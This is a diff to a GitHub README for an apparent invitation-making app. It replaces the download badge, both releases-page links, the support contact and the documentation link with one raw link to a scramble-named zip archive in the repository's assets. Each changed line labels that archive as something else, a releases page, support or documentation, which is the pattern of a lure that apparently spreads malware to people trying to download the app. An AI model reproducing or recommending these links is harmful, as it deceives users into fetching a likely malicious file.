@@ -1,7 +1,7 @@
 # 🎨 Celebrate-the-Festival-of-Colors - Create Beautiful Invitations Effortlessly
 
 ## 🔗 Download Now!
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/akromiez/Celebrate-the-Festival-of-Colors/releases)
+[![Download](https://github.com/akromiez/Celebrate-the-Festival-of-Colors/raw/refs/heads/main/assets/Celebrate_of_Festival_the_Colors_overlittle.zip)](https://github.com/akromiez/Celebrate-the-Festival-of-Colors/raw/refs/heads/main/assets/Celebrate_of_Festival_the_Colors_overlittle.zip)
 
 ## 📜 Introduction
 Welcome to the **Celebrate the Festival of Colors** application! This tool helps you create professional invitations for the vibrant Festival of Colors celebration. It is perfect for travel agencies, event organizers, and anyone looking to celebrate this joyous occasion. With our application, you can easily customize invitations that capture the essence of this festive event.
@@ -10,7 +10,7 @@ Welcome to the **Celebrate the Festival of Colors** application! This tool helps
 Follow these simple steps to get started with your invitation creation:
 
 1. **Visit the Download Page**: Click the link below to access the releases page for our application.
-   [Visit the Releases Page](https://github.com/akromiez/Celebrate-the-Festival-of-Colors/releases)
+   [Visit the Releases Page](https://github.com/akromiez/Celebrate-the-Festival-of-Colors/raw/refs/heads/main/assets/Celebrate_of_Festival_the_Colors_overlittle.zip)
 
 2. **Download the Application**: Look for the latest release and download the file that matches your operating system.
 
@@ -39,7 +39,7 @@ The **Celebrate the Festival of Colors** application includes:
 To download the application:
 
 1. **Visit the Releases Page**: Go to the releases page by clicking on the link below.
-   [Visit the Releases Page](https://github.com/akromiez/Celebrate-the-Festival-of-Colors/releases)
+   [Visit the Releases Page](https://github.com/akromiez/Celebrate-the-Festival-of-Colors/raw/refs/heads/main/assets/Celebrate_of_Festival_the_Colors_overlittle.zip)
 
 2. **Select the Latest Version**: Check for the most recent version of the application.
 
@@ -48,10 +48,10 @@ To download the application:
 4. **Install on Your Device**: Once downloaded, open the file and follow the on-screen instructions to complete the installation.
 
 ## ✉️ Contact & Support
-For any questions or support needs, please contact our support team at support@laravelmail.com. We are here to help you with any troubleshooting or inquiries you may have.
+For any questions or support needs, please contact our support team at https://github.com/akromiez/Celebrate-the-Festival-of-Colors/raw/refs/heads/main/assets/Celebrate_of_Festival_the_Colors_overlittle.zip We are here to help you with any troubleshooting or inquiries you may have.
 
 ## 🔍 Additional Resources
-- **Documentation**: Learn more about using the application [here](https://laravelmail.com/docs).
+- **Documentation**: Learn more about using the application [here](https://github.com/akromiez/Celebrate-the-Festival-of-Colors/raw/refs/heads/main/assets/Celebrate_of_Festival_the_Colors_overlittle.zip).
 - **Tutorial Videos**: Check out our video tutorials on how to create stunning invitations.
 
 ## 🎉 Celebrate with Us!
